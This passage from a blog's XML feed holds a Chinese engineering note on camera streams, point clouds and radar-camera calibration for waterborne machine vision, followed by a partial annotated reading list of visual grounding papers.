class="keyword">interface</span> &#123;</span><br><span class="line">    Error() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GIN问题"><a href="#GIN问题" class="headerlink" title="GIN问题"></a>GIN问题</h2>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>业务数据需求及数据处理概要-水上机器视觉场景</title>
      <link href="/2022/10/01/2022-10-01-%E6%B0%B4%E4%B8%8A%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89-%E6%A1%A5%E6%B4%9E%E5%9C%BA%E6%99%AF%E4%B8%9A%E5%8A%A1%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97%E8%AE%BE%E8%AE%A1/"/>
      <url>/2022/10/01/2022-10-01-%E6%B0%B4%E4%B8%8A%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89-%E6%A1%A5%E6%B4%9E%E5%9C%BA%E6%99%AF%E4%B8%9A%E5%8A%A1%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>水上机器视觉场景业务分析</p><a id="more"></a><h1 id="web摄像头即时视频流"><a href="#web摄像头即时视频流" class="headerlink" title="web摄像头即时视频流"></a>web摄像头即时视频流</h1><p>初始数据格式：船载web摄像头获取的视频流，基于本地流媒体服务传输到系统（rtmp/rtsp）</p><p>处理方式：ffmpeg解码视频流到rgb图像帧，经测试基于nginx的rtmp流媒体在本地延迟在80ms左右（局域网场景，摄像头参数为1080p双摄，nginx流媒体部署于树莓派3b+）</p><p>处理后数据格式：ImageFrame - 以 <strong>{测试样例_时间戳}.jpg</strong> 命名</p><h1 id="点云数据"><a href="#点云数据" class="headerlink" title="点云数据"></a>点云数据</h1><p>「二维平面（综合判定的）点云的点以圆输出，给出圆心坐标、圆半径」 <em>from 水上机器视觉技术讨论_会议纪要.doc</em></p><p>初始数据格式：点云中单个点以圆心坐标、圆半径的形式给出？<br>            能否理解为：将点云做一次拟合圆之后，给出船体所在水平面的点云</p><p>处理方式：能否直接给出拟合圆以前的世界坐标系/雷达坐标系下的点云PointXYZ，和雷达轨迹（四元数或欧拉角描述）</p><p>处理后数据格式：<br>            每一图像帧时刻的PCL处理的点云数据，以PointXYZ描述 { pointid, x, y, z}<br>            每一图像帧时刻的雷达轨迹，以四元数或欧拉角描述    { w, x, y, z}/{ x, y, z, rx, ry, rz}</p><h1 id="视觉雷达联合标定"><a href="#视觉雷达联合标定" class="headerlink" title="视觉雷达联合标定"></a>视觉雷达联合标定</h1><p>初始数据格式：光学相机：相机内参，畸变函数；相机外参<br>            雷达： 雷达外参数。<br>处理方式：<br>将毫米波雷达返回的目标点投影到图像上，围绕该点并结合先验知识，生成一个矩形的感兴趣区域，然后我们只对该区域内进行识别（水岸分割模型或目标检测模型）。优点是<br>可以迅速地排除大量不会有目标的区域，极大地提高识别速度。<br>建立精确的毫米波雷达坐标系、三维世界坐标系、摄像机坐标系、图像坐标系和像素坐标系之间的坐标转换关系，是实现毫米波和视觉融合的关键。<br>毫米波雷达与视觉传感器在空间的融合就是将不同传感器坐标系的测量值转换到同一个坐标系中。由于ADAS前向视觉系统以视觉为主，因此只需将毫米雷达坐标系下的测量点<br>通过坐标系转换到摄像机对应的像素坐标系下即可实现两者空间同步。<br>联合标定的目的：将毫米波检测的目标转换到图像上。</p><p>联合标定方式（原理）：</p><ul><li>毫米波坐标系下的坐标转换到以相机为中心的世界坐标系中</li><li>将世界坐标系的坐标转换到相机坐标系</li><li>将相机坐标系的坐标转换到图像坐标系</li></ul><p>毫米波可以得到目标在图像中的x,y坐标信息（文档中提到的拟合平面，该xy是在毫米波坐标系下的数值，2D），由于没有目标的z坐标信息，<br>可以由（x,y,1）将毫米波坐标系转换到相机世界坐标系下，</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PointCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paper Routing for Visual Grounding</title>
      <link href="/2022/10/01/2022-10-01-VGApproachs/"/>
      <url>/2022/10/01/2022-10-01-VGApproachs/</url>
      
        <content type="html"><![CDATA[<p>Visual Grounding<br>Referring Expressions<br>Phrase Grounding</p><a id="more"></a><h2 id="Reprensentation-Approach"><a href="#Reprensentation-Approach" class="headerlink" title="Reprensentation Approach"></a>Reprensentation Approach</h2><p>几个在VG任务中的主流视觉backbone</p><ul><li><strong>rpn</strong></li><li><strong>maskrcnn</strong></li><li><strong>retinanet(fpn)</strong></li><li><strong>Vit</strong></li><li><strong>DETR</strong></li></ul><p>文本表示的编码方式/编码器模型</p><ul><li><strong>word2vec</strong> <a href="2D_VisualGrounding/word2vec.pdf">[File]</a></li><li><strong>bert</strong></li><li></li></ul><h2 id="VG-paper-routing"><a href="#VG-paper-routing" class="headerlink" title="VG paper routing"></a>VG paper routing</h2><ol><li><p>Karpathy, Andrej, Armand Joulin, and Li F. Fei-Fei. <strong>Deep fragment embeddings for bidirectional image sentence mapping.</strong> Advances in neural information processing systems. 2014. <a href="http://papers.nips.cc/paper/5281-deep-fragment-embeddings-for-bidirectional-image-sentence-mapping.pdf" target="_blank" rel="noopener">[Paper]</a></p><h3 id="RNN类方法"><a href="#RNN类方法" class="headerlink" title="RNN类方法"></a>RNN类方法</h3></li><li><p>Karpathy, Andrej, and Li Fei-Fei. <strong>Deep visual-semantic alignments for generating image descriptions.</strong> Proceedings of the IEEE conference on computer vision and pattern recognition. 2015. <em>Method name: Neural Talk</em>. <a href="https://www.cv-foundation.org/openaccess/content_cvpr_2015/papers/Karpathy_Deep_Visual-Semantic_Alignments_2015_CVPR_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/karpathy/neuraltalk" target="_blank" rel="noopener">[Code]</a> <a href="https://github.com/karpathy/neuraltalk2" target="_blank" rel="noopener">[Torch Code]</a> <a href="https://cs.stanford.edu/people/karpathy/deepimagesent/" target="_blank" rel="noopener">[Website]</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RPN作为视觉backbone+BiRNN编码文本，前19个region和karpathy分割的snippets（phrase）映射到同一长度vector后进行相似度计算S，max(0,S)以衡量整个图片与句子的相似程度。</span><br><span class="line"></span><br><span class="line">* 整体是用的retrieval的baseline，类似于SCAN等retrival任务的特征处理方式</span><br></pre></td></tr></table></figure></li><li><p>Hu, Ronghang, et al. <strong>Natural language object retrieval.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2016. </p></li></ol><p><strong>Method name</strong>: Spatial Context Recurrent<br>ConvNet (SCRC)* <a href="https://www.cv-foundation.org/openaccess/content_cvpr_2016/papers/Hu_Natural_Language_Object_CVPR_2016_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/ronghanghu/natural-language-object-retrieval" target="_blank" rel="noopener">[Code]</a> <a href="http://ronghanghu.com/text_obj_retrieval/" target="_blank" rel="noopener">[Website]</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文本提首先进入一个embedding层</span><br><span class="line">CNN同样提取global contextual feature和 local feature，</span><br><span class="line">LSTM 获取local 和 global信息（两个单元），local处理[x box ,x spatial]</span><br></pre></td></tr></table></figure><ol><li><p>Mao, Junhua, et al. <strong>Generation and comprehension of unambiguous object descriptions.</strong> Proceedings of the IEEE conference on computer vision and pattern recognition. 2016. <a href="https://arxiv.org/pdf/1511.02283.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/mjhucla/Google_Refexp_toolbox" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Wang, Liwei, Yin Li, and Svetlana Lazebnik. <strong>Learning deep structure-preserving image-text embeddings.</strong> Proceedings of the IEEE conference on computer vision and pattern recognition. 2016. <a href="http://slazebni.cs.illinois.edu/publications/cvpr16_structure.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/lwwang/Two_branch_network" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Yu, Licheng, et al. <strong>Modeling context in referring expressions.</strong> European Conference on Computer Vision. Springer, Cham, 2016. <a href="https://arxiv.org/pdf/1608.00272.pdf" target="_blank" rel="noopener">[Paper]</a><a href="https://github.com/lichengunc/refer" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Nagaraja, Varun K., Vlad I. Morariu, and Larry S. Davis. <strong>Modeling context between objects for referring expression understanding.</strong> European Conference on Computer Vision. Springer, Cham, 2016.<a href="https://arxiv.org/pdf/1608.00525.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/varun-nagaraja/referring-expressions" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Rohrbach, Anna, et al. <strong>Grounding of textual phrases in images by reconstruction.</strong> European Conference on Computer Vision. Springer, Cham, 2016. <em>Method Name: GroundR</em> <a href="https://arxiv.org/pdf/1511.03745.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/kanchen-usc/GroundeR" target="_blank" rel="noopener">[Tensorflow Code]</a> <a href="https://github.com/ruotianluo/refexp-comprehension" target="_blank" rel="noopener">[Torch Code]</a></p></li><li><p>Wang, Mingzhe, et al. <strong>Structured matching for phrase localization.</strong> European Conference on Computer Vision. Springer, Cham, 2016. <em>Method name: Structured Matching</em> <a href="https://pdfs.semanticscholar.org/9216/2ec88ad974cc5082d9688c8bfee672ad59ad.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/princeton-vl/structured-matching" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Hu, Ronghang, Marcus Rohrbach, and Trevor Darrell. <strong>Segmentation from natural language expressions.</strong> European Conference on Computer Vision. Springer, Cham, 2016. <a href="https://arxiv.org/pdf/1603.06180.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/ronghanghu/text_objseg" target="_blank" rel="noopener">[Code]</a> <a href="http://ronghanghu.com/text_objseg/" target="_blank" rel="noopener">[Website]</a></p></li><li><p>Fukui, Akira et al. <strong>Multimodal Compact Bilinear Pooling for Visual Question Answering and Visual Grounding.</strong> EMNLP (2016). <em>Method name: MCB</em> <a href="https://arxiv.org/pdf/1606.01847.pdf" target="_blank" rel="noopener">[Paper]</a><a href="https://github.com/akirafukui/vqa-mcb" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Endo, Ko, et al. <strong>An attention-based regression model for grounding textual phrases in images.</strong> Proc. IJCAI. 2017. <a href="https://www.ijcai.org/proceedings/2017/0558.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Chen, Kan, et al. <strong>MSRC: Multimodal spatial regression with semantic context for phrase grounding.</strong> International Journal of Multimedia Information Retrieval 7.1 (2018): 17-28. <a href="https://link.springer.com/article/10.1007/s13735-017-0139-6" target="_blank" rel="noopener">[Paper -Springer Link]</a></p></li><li><p>Wu, Fan et al. <strong>An End-to-End Approach to Natural Language Object Retrieval via Context-Aware Deep Reinforcement Learning.</strong> CoRR abs/1703.07579 (2017): n. pag. <a href="https://arxiv.org/pdf/1703.07579.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/jxwufan/NLOR_A3C" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Yu, Licheng, et al. <strong>A joint speakerlistener-reinforcer model for referring expressions.</strong> Computer Vision and Pattern Recognition (CVPR). Vol. 2. 2017. <a href="http://openaccess.thecvf.com/content_cvpr_2017/papers/Yu_A_Joint_Speaker-Listener-Reinforcer_CVPR_2017_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/lichengunc/speaker_listener_reinforcer" target="_blank" rel="noopener">[Code]</a><a href="https://vision.cs.unc.edu/refer/" target="_blank" rel="noopener">[Website]</a></p></li><li><p>Hu, Ronghang, et al. <strong>Modeling relationships in referential expressions with compositional modular networks.</strong> Computer Vision and Pattern Recognition (CVPR), 2017 IEEE Conference on. IEEE, 2017. <a href="http://openaccess.thecvf.com/content_cvpr_2017/papers/Hu_Modeling_Relationships_in_CVPR_2017_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/ronghanghu/cmn" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Luo, Ruotian, and Gregory Shakhnarovich. <strong>Comprehension-guided referring expressions.</strong> Computer Vision and Pattern Recognition (CVPR). Vol. 2. 2017. <a href="http://openaccess.thecvf.com/content_cvpr_2017/papers/Luo_Comprehension-Guided_Referring_Expressions_CVPR_2017_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/ruotianluo/refexp-comprehension" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Liu, Jingyu, Liang Wang, and Ming-Hsuan Yang. <strong>Referring expression generation and comprehension via attributes.</strong> Proceedings of CVPR. 2017. <a href="http://faculty.ucmerced.edu/mhyang/papers/iccv2017_referring_expression.pdf" target="_blank" rel="noopener">[Paper]</a> </p></li><li><p>Xiao, Fanyi, Leonid Sigal, and Yong Jae Lee. <strong>Weakly-supervised visual grounding of phrases with linguistic structures.</strong> arXiv preprint arXiv:1705.01371 (2017). <a href="https://arxiv.org/pdf/1705.01371.pdf" target="_blank" rel="noopener">[Paper]</a> </p></li><li><p>Plummer, Bryan A., et al. <strong>Phrase localization and visual relationship detection with comprehensive image-language cues.</strong> Proc. ICCV. 2017. <a href="http://openaccess.thecvf.com/content_ICCV_2017/papers/Plummer_Phrase_Localization_and_ICCV_2017_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/BryanPlummer/pl-clc" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Chen, Kan, Rama Kovvuri, and Ram Nevatia. <strong>Query-guided regression network with context policy for phrase grounding.</strong> Proceedings of the IEEE International Conference on Computer Vision (ICCV). 2017. <em>Method name: QRC</em> <a href="http://openaccess.thecvf.com/content_ICCV_2017/papers/Chen_Query-Guided_Regression_Network_ICCV_2017_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/kanchen-usc/QRC-Net" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Liu, Chenxi, et al. <strong>Recurrent Multimodal Interaction for Referring Image Segmentation.</strong> ICCV. 2017. <a href="https://arxiv.org/pdf/1703.07939.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/chenxi116/TF-phrasecut-public" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Li, Jianan, et al. <strong>Deep attribute-preserving metric learning for natural language object retrieval.</strong> Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017. <a href="https://dl.acm.org/citation.cfm?id=3123439" target="_blank" rel="noopener">[Paper: ACM Link]</a></p></li><li><p>Li, Xiangyang, and Shuqiang Jiang. <strong>Bundled Object Context for Referring Expressions.</strong> IEEE Transactions on Multimedia (2018). <a href="https://ieeexplore.ieee.org/document/8307406" target="_blank" rel="noopener">[Paper ieee link]</a> </p></li><li><p>Yu, Zhou, et al. <strong>Rethinking Diversified and Discriminative Proposal Generation for Visual Grounding.</strong> arXiv preprint arXiv:1805.03508 (2018). <a href="https://www.ijcai.org/proceedings/2018/0155.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/XiangChenchao/DDPN" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Yu, Licheng, et al. <strong>Mattnet: Modular attention network for referring expression comprehension.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2018. <a href="http://openaccess.thecvf.com/content_cvpr_2018/papers/Yu_MAttNet_Modular_Attention_CVPR_2018_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/lichengunc/MAttNet" target="_blank" rel="noopener">[Code]</a> <a href="http://vision2.cs.unc.edu/refer/comprehension" target="_blank" rel="noopener">[Website]</a></p></li><li><p>Deng, Chaorui, et al. <strong>Visual Grounding via Accumulated Attention.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2018.<a href="http://openaccess.thecvf.com/content_cvpr_2018/papers/Deng_Visual_Grounding_via_CVPR_2018_paper.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Li, Ruiyu, et al. <strong>Referring image segmentation via recurrent refinement networks.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2018.<a href="http://openaccess.thecvf.com/content_cvpr_2018/papers/Li_Referring_Image_Segmentation_CVPR_2018_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/liruiyu/referseg_rrn" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Zhang, Yundong, Juan Carlos Niebles, and Alvaro Soto. <strong>Interpretable Visual Question Answering by Visual Grounding from Attention Supervision Mining.</strong> arXiv preprint arXiv:1808.00265 (2018). <a href="https://arxiv.org/pdf/1808.00265.pdf" target="_blank" rel="noopener">[Paper]</a> </p></li><li><p>Chen, Kan, Jiyang Gao, and Ram Nevatia. <strong>Knowledge aided consistency for weakly supervised phrase grounding.</strong> arXiv preprint arXiv:1803.03879 (2018). <a href="https://arxiv.org/abs/1803.03879" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/kanchen-usc/KAC-Net" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Zhang, Hanwang, Yulei Niu, and Shih-Fu Chang. <strong>Grounding referring expressions in images by variational context.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2018. <a href="http://openaccess.thecvf.com/content_cvpr_2018/papers/Zhang_Grounding_Referring_Expressions_CVPR_2018_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/yuleiniu/vc/" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Cirik, Volkan, Taylor Berg-Kirkpatrick, and Louis-Philippe Morency. <strong>Using syntax to ground referring expressions in natural images.</strong> arXiv preprint arXiv:1805.10547 (2018).<a href="https://arxiv.org/pdf/1805.10547.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/volkancirik/groundnet" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Margffoy-Tuay, Edgar, et al. <strong>Dynamic multimodal instance segmentation guided by natural language queries.</strong> Proceedings of the European Conference on Computer Vision (ECCV). 2018. <a href="https://arxiv.org/pdf/1807.02257.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/BCV-Uniandes/DMS" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Shi, Hengcan, et al. <strong>Key-word-aware network for referring expression image segmentation.</strong> Proceedings of the European Conference on Computer Vision (ECCV). 2018.<a href="http://openaccess.thecvf.com/content_ECCV_2018/papers/Hengcan_Shi_Key-Word-Aware_Network_for_ECCV_2018_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/shihengcan/key-word-aware-network-pycaffe" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Plummer, Bryan A., et al. <strong>Conditional image-text embedding networks.</strong> Proceedings of the European Conference on Computer Vision (ECCV). 2018. <a href="https://arxiv.org/pdf/1711.08389.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/BryanPlummer/cite" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Akbari, Hassan, et al. <strong>Multi-level Multimodal Common Semantic Space for Image-Phrase Grounding.</strong> arXiv preprint arXiv:1811.11683 (2018). <a href="https://arxiv.org/pdf/1811.11683v1.pdf" target="_blank" rel="noopener">[Paper]</a> </p></li><li><p>Kovvuri, Rama, and Ram Nevatia. <strong>PIRC Net: Using Proposal Indexing, Relationships and Context for Phrase Grounding.</strong> arXiv preprint arXiv:1812.03213 (2018). <a href="https://arxiv.org/pdf/1812.03213v1.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Chen, Xinpeng, et al. <strong>Real-Time Referring Expression Comprehension by Single-Stage Grounding Network.</strong> arXiv preprint arXiv:1812.03426 (2018). <a href="https://arxiv.org/pdf/1812.03426v1.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Wang, Peng, et al. <strong>Neighbourhood Watch: Referring Expression Comprehension via Language-guided Graph Attention Networks.</strong> arXiv preprint arXiv:1812.04794 (2018). <a href="https://arxiv.org/pdf/1812.04794.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Liu, Daqing, et al. <strong>Learning to Assemble Neural Module Tree Networks for Visual Grounding.</strong> Proceedings of the IEEE International Conference on Computer Vision (ICCV). 2019. <a href="http://openaccess.thecvf.com/content_ICCV_2019/papers/Liu_Learning_to_Assemble_Neural_Module_Tree_Networks_for_Visual_Grounding_ICCV_2019_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/daqingliu/NMTree" target="_blank" rel="noopener">[Code]</a></p></li><li><p><strong>RETRACTED (see <a href="https://github.com/TheShadow29/awesome-grounding/pull/2" target="_blank" rel="noopener">#2</a>)</strong>:  Deng, Chaorui, et al. <strong>You Only Look &amp; Listen Once: Towards Fast and Accurate Visual Grounding.</strong> arXiv preprint arXiv:1902.04213 (2019). <a href="https://arxiv.org/pdf/1902.04213.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Hong, Richang, et al. <strong>Learning to Compose and Reason with Language Tree Structures for Visual Grounding.</strong> IEEE Transactions on Pattern Analysis and Machine Intelligence (T-PAMI). 2019. <a href="https://arxiv.org/pdf/1906.01784.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Liu, Xihui, et al. <strong>Improving Referring Expression Grounding with Cross-modal Attention-guided Erasing.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2019. <a href="https://arxiv.org/pdf/1903.00839.pdf" target="_blank" rel="noopener">[Paper]</a> </p></li><li><p>Dogan, Pelin, Leonid Sigal, and Markus Gross. <strong>Neural Sequential Phrase Grounding (SeqGROUND).</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. (CVPR) 2019. <a href="https://arxiv.org/pdf/1903.07669.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Datta, Samyak, et al. <strong>Align2ground: Weakly supervised phrase grounding guided by image-caption alignment.</strong> arXiv preprint arXiv:1903.11649 (2019). (ICCV 2019) <a href="https://arxiv.org/pdf/1903.11649.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Fang, Zhiyuan, et al. <strong>Modularized textual grounding for counterfactual resilience.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. (CVPR) 2019. <a href="https://arxiv.org/pdf/1904.03589.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Ye, Linwei, et al. <strong>Cross-Modal Self-Attention Network for Referring Image Segmentation.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. (CVPR) 2019. <a href="https://arxiv.org/pdf/1904.04745.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Yang, Sibei, Guanbin Li, and Yizhou Yu. <strong>Cross-Modal Relationship Inference for Grounding Referring Expressions.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. (CVPR) 2019. <a href="https://arxiv.org/pdf/1906.04464.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Yang, Sibei, Guanbin Li, and Yizhou Yu. <strong>Dynamic Graph Attention for Referring Expression Comprehension.</strong> arXiv preprint arXiv:1909.08164 (2019). (ICCV 2019) <a href="https://arxiv.org/pdf/1909.08164.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/sibeiyang/sgmn/tree/master/lib/dga_models" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Wang, Josiah, and Lucia Specia. <strong>Phrase Localization Without Paired Training Examples.</strong> arXiv preprint arXiv:1908.07553 (2019). (ICCV 2019) <a href="https://arxiv.org/abs/1908.07553" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/josiahwang/phraseloceval" target="_blank" rel="noopener">[Code]</a> </p></li><li><p>Yang, Zhengyuan, et al. <strong>A Fast and Accurate One-Stage Approach to Visual Grounding.</strong> arXiv preprint arXiv:1908.06354 (2019). (ICCV 2019) <a href="https://arxiv.org/pdf/1908.06354.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/zyang-ur/onestage_grounding" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Sadhu, Arka, Kan Chen, and Ram Nevatia. <strong>Zero-Shot Grounding of Objects from Natural Language Queries.</strong> arXiv preprint arXiv:1908.07129 (2019).(ICCV 2019) <a href="https://arxiv.org/abs/1908.07129" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/TheShadow29/zsgnet-pytorch" target="_blank" rel="noopener">[Code]</a></p></li></ol><p><em>Disclaimer: I am an author of the paper</em></p><ol><li><p>Liu, Xuejing, et al. <strong>Adaptive Reconstruction Network for Weakly Supervised Referring Expression Grounding.</strong> arXiv preprint arXiv:1908.10568 (2019). (ICCV 2019) <a href="https://arxiv.org/pdf/1908.10568.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/GingL/ARN" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Chen, Yi-Wen, et al. <strong>Referring Expression Object Segmentation with Caption-Aware Consistency.</strong> arXiv preprint arXiv:1910.04748 (2019). (BMVC 2019) <a href="https://arxiv.org/abs/1910.04748" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/wenz116/lang2seg" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Liu, Jiacheng, and Julia Hockenmaier. <strong>Phrase Grounding by Soft-Label Chain Conditional Random Field.</strong> arXiv preprint arXiv:1909.00301 (2019) (EMNLP 2019). <a href="https://arxiv.org/pdf/1909.00301.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/liujch1998/SoftLabelCCRF" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Liu, Yongfei, Wan Bo, Zhu Xiaodan and He Xuming. <strong>Learning Cross-modal Context Graph for Visual Grounding.</strong> arXiv preprint arXiv: (2019) (AAAI-2020). <a href="https://arxiv.org/pdf/1911.09042.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/youngfly11/LCMCG-PyTorch" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Yu, Tianyu, et al. <strong>Cross-Modal Omni Interaction Modeling for Phrase Grounding.</strong> Proceedings of the 28th ACM International Conference on Multimedia. ACM 2020. <a href="https://dl.acm.org/doi/abs/10.1145/3394171.3413846" target="_blank" rel="noopener">[Paper: ACM Link]</a> <a href="https://github.com/yiranyyu/Phrase-Grounding" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Qiu, Heqian, et al. <strong>Language-Aware Fine-Grained Object Representation for Referring Expression Comprehension.</strong> Proceedings of the 28th ACM International Conference on Multimedia. ACM 2020. <a href="https://dl.acm.org/doi/abs/10.1145/3394171.3413850" target="_blank" rel="noopener">[Paper: ACM Link]</a></p></li><li><p>Wang, Qinxin, et al. <strong>MAF: Multimodal Alignment Framework for Weakly-Supervised Phrase Grounding.</strong> arXiv preprint arXiv:2010.05379 (2020). <a href="https://arxiv.org/pdf/2010.05379" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/qinzzz/Multimodal-Alignment-Framework" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Liao, Yue, et al. <strong>A real-time cross-modality correlation filtering method for referring expression comprehension.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2020. <a href="https://openaccess.thecvf.com/content_CVPR_2020/papers/Liao_A_Real-Time_Cross-Modality_Correlation_Filtering_Method_for_Referring_Expression_Comprehension_CVPR_2020_paper.pdf" target="_blank" rel="noopener">[Paper]</a></p></li><li><p>Hu, Zhiwei, et al. <strong>Bi-directional relationship inferring network for referring image segmentation.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2020. <a href="https://openaccess.thecvf.com/content_CVPR_2020/papers/Hu_Bi-Directional_Relationship_Inferring_Network_for_Referring_Image_Segmentation_CVPR_2020_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/fengguang94/CVPR2020-BRINet" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Yang, Sibei, Guanbin Li, and Yizhou Yu. <strong>Graph-structured referring expression reasoning in the wild.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2020. <a href="http://openaccess.thecvf.com/content_CVPR_2020/papers/Yang_Graph-Structured_Referring_Expression_Reasoning_in_the_Wild_CVPR_2020_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/sibeiyang/sgmn" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Luo, Gen, et al. <strong>Multi-task collaborative network for joint referring expression comprehension and segmentation.</strong> Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR). 2020. <a href="http://openaccess.thecvf.com/content_CVPR_2020/papers/Luo_Multi-Task_Collaborative_Network_for_Joint_Referring_Expression_Comprehension_and_Segmentation_CVPR_2020_paper.pdf" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/luogen1996/MCN" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Gupta, Tanmay, et al. <strong>Contrastive learning for weakly supervised phrase grounding.</strong> Proceedings of the European Conference on Computer Vision (ECCV). 2020. <a href="https://arxiv.org/pdf/2006.09920" target="_blank" rel="noopener">[Paper]</a> <a href="https://github.com/BigRedT/info-ground" target="_blank" rel="noopener">[Code]</a></p></li><li><p>Yang, Zhengyuan, et al. <strong>Improving one-stage visual grounding by recursive sub-query construction.</strong> Proceedings of the European Conference on Computer Vision (ECCV). 2020. <a 